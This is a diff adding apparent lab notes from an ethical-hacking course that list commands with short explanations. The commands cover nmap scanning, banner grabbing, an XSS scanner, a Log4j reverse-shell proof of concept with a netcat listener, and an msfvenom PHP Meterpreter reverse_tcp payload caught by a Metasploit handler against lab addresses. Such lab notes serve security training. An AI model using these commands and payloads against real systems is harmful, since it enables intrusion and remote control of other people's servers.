@@ -1,0 +1,48 @@
+Extracted Commands with Explanations:
+
+nmap -T4 -A -v www.moviescope.com
+Aggressive scan to detect OS, open ports, and services on the target domain.
+
+telnet www.moviescope.com 80 followed by GET / HTTP/1.0
+Banner grabbing via Telnet to retrieve HTTP server headers.
+
+python3 pwnxss.py -u http://testphp.vulnweb.com
+Scan for XSS vulnerabilities in the specified URL using PwnXSS.
+
+docker build -t log4j-shell-poc .
+Build a Docker image for a vulnerable Log4j server.
+
+docker run --network host log4j-shell-poc
+Run the Log4j vulnerable server in host network mode.
+
+python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001
+Generate a Log4j exploit payload targeting a specific IP and ports.
+
+nc -lvp 9001
+Start a Netcat listener to capture a reverse shell.
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=4444 -f raw > upload.php
+Create a PHP Meterpreter payload for reverse TCP connection.
+
+msfconsole
+Launch the Metasploit Framework console.
+
+use exploit/multi/handler
+Select the Metasploit multi-handler exploit module.
+
+set payload php/meterpreter/reverse_tcp
+Configure the payload type for the Metasploit handler.
+
+set LHOST 10.10.1.13
+Define the listener IP for the Metasploit handler.
+
+set LPORT 4444
+Set the listener port for the Metasploit handler.
+
+run
+Execute the Metasploit handler to wait for connections.
+
+sudo apt-get install docker.io openjdk-8-jdk
+Install Docker and Java dependencies for Log4j server setup.
+
+Note: Tasks 2, 3, 4, and 8 involve GUI tools (OWASP ZAP, Burp Suite, N-Stalker) and do not use CLI commands.
